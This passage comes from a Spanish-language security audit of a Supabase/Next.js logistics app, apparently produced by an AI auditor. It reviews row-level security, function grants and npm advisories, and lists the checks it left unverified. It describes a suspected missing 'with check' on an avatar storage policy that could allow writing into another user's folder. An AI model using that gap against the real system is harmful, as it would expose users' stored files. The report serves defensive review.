—frontera de segmento, `:43`—. Lo consumen `login/acciones.ts:66,80` y
`auth/callback/route.ts:18`.

**El chat no traduce lenguaje natural a SQL.** `chat.tsx:48-76` es coincidencia
de palabras clave contra datos ya calculados en el servidor; el texto del usuario
nunca llega a la base, y el razonamiento está escrito (`:8-14`). El problema de
`/dashboard/chat` no es el chat: es quién puede abrir la página.

**RLS de las cuatro tablas nuevas, bien escrita para el chofer.** Las cuatro
nacen con RLS (`0047:158-165`), tres con `not is_operador()` en `using` **y**
`with check` (`:170-177`), y `pod` con las dos policies del chofer acotadas por
`get_user_operador_id()` y **sin DELETE** (`:187-193`). Es la lección de la 0045
aplicada; lo que no aplicó es la del contador.

**Funciones y grants, recorridos uno por uno.** Crucé cada
`create or replace function` contra su `revoke`: `guardar_liquidacion_tx` está
cubierta en las **dos** firmas (0013:55 para la de 11 args, 0021:55 para la de 12
—el caso clásico de sobrecarga nueva que hereda los grants por default, y aquí
sí se atendió—); `intake_delta` (0031:83), `marcar_aviso_privacidad` (0018:65),
`confirmar`/`liberar_aviso_privacidad` (0033:143-146), `enriquecer_gasto_codigo`
(0017:55) y `triggers_faltantes` (0043:42) revocan de `public, anon,
authenticated`. Las que quedan sin revocar —`get_user_tenant_ids`,
`is_superadmin` (0001), `is_operador`, `get_user_operador_id` (0045),
`config_tenant_valida`, `telefono_normalizado`— **las descarto por escrito**: las
cuatro primeras son `security definer` pero están ancladas a `auth.uid()`, así
que para `anon` devuelven arreglo vacío / `false` / `null`, y las dos últimas son
puras. Las únicas dos con grant vivo y efecto son las del mutex (BAJO de arriba).

**`/mis-viajes` usa RLS de verdad, no un `.eq()` de cortesía.**
`mis-viajes/page.tsx:57` consulta con `supabaseServer()` (cliente **con sesión**),
no con `supabaseAdmin()`, y el comentario `:49-55` razona por qué: «un `.eq()`
que se le olvide a alguien en este archivo seguiría sin filtrar de más». Es el
único sitio del repo donde la RLS del chofer es la defensa primaria y está usada
como corresponde.

**`/aviso/[tenant]` sigue sin ser una fuga.** Valida el uuid con regex antes de
consultar (`:62`), y `notFound()` es indistinguible entre «no existe» y «no
publicado» (`:69`). Solo devuelve razón social y domicilio, que es lo que la
LFPDPPP obliga a poner a disposición.

### CVE — los 11 de `npm audit`, uno por uno, y por qué los descarto

`npm audit` sobre este árbol da **11 (2 críticas, 6 altas, 3 moderadas)** —
idéntico al pase 1. Ninguna tiene camino real de explotación en esta app. Por
escrito:

- **`vitest` + `@vitest/coverage-v8` (2 críticas)** — la misma advisory contada
  dos veces, vía `esbuild`/`vite`. `devDependencies`; `esbuild`
  GHSA-67mh-4wv8-2f99 solo afecta al **dev server** y nunca se corre `--ui`. No
  hay `vite` ni `esbuild` en el runtime de la función desplegada. **Descartada.**
- **`postcss` (4 advisories, alta, vía `next`)** — build-time. Las cuatro son XSS
  por `</style>` sin escapar y lectura de archivo por `sourceMappingURL`; el
  único CSS del repo es `globals.css`, que no lo controla un atacante. No entra
  al bundle de la función. **Descartada.**
- **`fast-uri` (alta, GHSA-7p8r-x3mc-p8w7, host confusion)** — `npm ls fast-uri`
  da **una sola ruta**: `@sentry/nextjs → @sentry/webpack-plugin → webpack →
  schema-utils → ajv → fast-uri`. Es el plugin de webpack que sube los source
  maps; no hay un `require` de `ajv` en el runtime y ninguna URL controlada por
  un atacante pasa por ahí. Build-time puro. **Descartada.**
- **`next` (alta, solo por depender de `postcss` y `sharp`)** — no aporta camino
  propio. Y **CVE-2025-29927** (bypass de middleware por
  `x-middleware-subrequest`) **no aplica**: `next@16.2.11` instalado, arreglado
  en 15.2.3. Lo verifiqué a propósito porque el proxy es la primera capa de todo
  el panel. **Descartada.**
- **`sharp` 0.34.5 (alta, GHSA-f88m-g3jw-g9cj, cuatro CVE de libvips)** — el
  **único** paquete que toca bytes de un atacante: `intake/cfdi.ts:249` y
  `intake/ocr.ts:245,248` corren `sharp()` sobre lo que baja de WhatsApp.
  Reverifiqué el orden en `processor.ts`: `resolveOperador` corre en `:280` y la
  primera descarga en `:316` — hay que ser **un operador dado de alta y activo**
  para llegar al decodificador. El avatar no pasa por `sharp`
  (`mi-perfil/acciones.ts:59` sube el Blob tal cual) y `/dashboard/pod` no
  procesa imágenes: las superficies nuevas de esta ronda **no ensanchan** el
  canal. Sigue siendo **observación vigilada, no hallazgo** — pero hay arreglo
  publicado (`sharp@0.35.3`) y `package.json:32` sigue fijando `^0.34.0`, tercera
  ronda igual.

### Compuerta, medida hoy sobre esta rama

```
npx tsc --noEmit -p .  → exit 0
npx vitest run         → 269 archivos · 2530 pruebas · 1 saltada
                         3 archivos / 3-4 pruebas fallan, y NO son de seguridad:
                         son de reloj y de tamaño de imagen (p.ej.
                         normas/fundamento.test.ts:144 `expect(721).toBeLessThan(500)`).
                         Corrí la suite dos veces y el conteo de fallos cambió
                         (3 vs 4): son intermitentes bajo carga — doce auditores
                         en paralelo sobre la misma máquina. Lo anoto para no
                         achacarle al código una compuerta roja que no lo es; su
                         dueño es el rubro de pruebas.
npm audit              → 11 (2 críticas, 6 altas, 3 moderadas) — idéntico al pase 1
```

---

## Lo que NO alcancé a revisar

- **Ejecutar contra Postgres real los dos hallazgos de RLS y el de grants.** Todo
  mi razonamiento es sobre el texto de las policies (`0045:39`, `0001:110-116`,
  `0047:170,183`) y sobre qué cliente usa cada página, leídos línea por línea —
  pero no corrí `set local role authenticated` + `update operador …` ni
  `has_function_privilege('authenticated','try_lock_viaje…')` contra la base del
  proyecto, que es lo que los volvería incontestables. El bloque 26 de
  `verificaciones.sql` solo **cuenta filas visibles** en tres tablas y nunca
  intenta escribir; el bloque 16 sí mira grants, pero solo de `anon`, y es un
  `raise exception` manual que nadie corre en CI.
- **El `with check` faltante de `avatares_propio_update` (`0046:32-35`).** La
  policy de UPDATE tiene `using` y no `with check`, lo que en teoría permite
  renombrar el propio objeto a la carpeta de otro usuario y contradice lo que la
  migración promete («no puede pisar el de alguien más aunque adivine la ruta»).
  Sigo sin poder determinar si `POST /storage/v1/object/move` exige además
  `insert` sobre el destino, que lo cerraría. Segunda ronda con el mismo
  pendiente: es una prueba de cinco minutos contra un proyecto real.
- **El estado del interruptor «Allow new users to sign up»** del proyecto
  Supabase. Ya no es un hallazgo (la reversión de `/auth/callback` lo cubre en
  código), pero si está encendido cada intento crea y borra un `auth.users`, y
  `autoregistro.ts:70-74` documenta el caso en que el borrado falla.
- **`privacidad/page.tsx` como sumidero de XSS.** Quinta ronda sin recorrerlo con
  el detalle que merece, y ahora pesa más porque el bucket público le da a un
  atacante dónde alojar el payload. Es la única razón por la que dejé el hallazgo
  de CSP en BAJO en vez de intentar armarle un escenario.
- **Concurrencia real del rate-limit.** Sexto pendiente idéntico: exige tráfico
  agresivo contra producción, que esta ronda prohíbe. Lo que sí verifiqué es que
  el módulo ya no promete lo que no puede (`ratelimit.ts:7-20`).
- **Las 12 funciones de escritura de `operacion.ts` una por una.** Verifiqué
  `crearViaje`, `crearIncidencia`, `marcarPodPedido`, `crearUnidad`,
  `asignarUnidad`, `cambiarEstadoUnidad`, `rechazarPod` y
  `cambiarEstadoIncidencia` —las ocho filtran por `tenant_id` en el WHERE o pasan
  por `exigirDelTenant`—, pero no las restantes.
- **`/admin` desde la óptica de qué cruza tenants a propósito y qué no.**
  `lib/admin/negocio.ts` tiene permiso explícito de cruzarlos (CLAUDE.md), así
  que auditarlo bien exige distinguir cruce autorizado de fuga, y eso son 420
  líneas que no recorrí completas. Solo verifiqué el camino de PII que cerró
  `bc7fc86`.
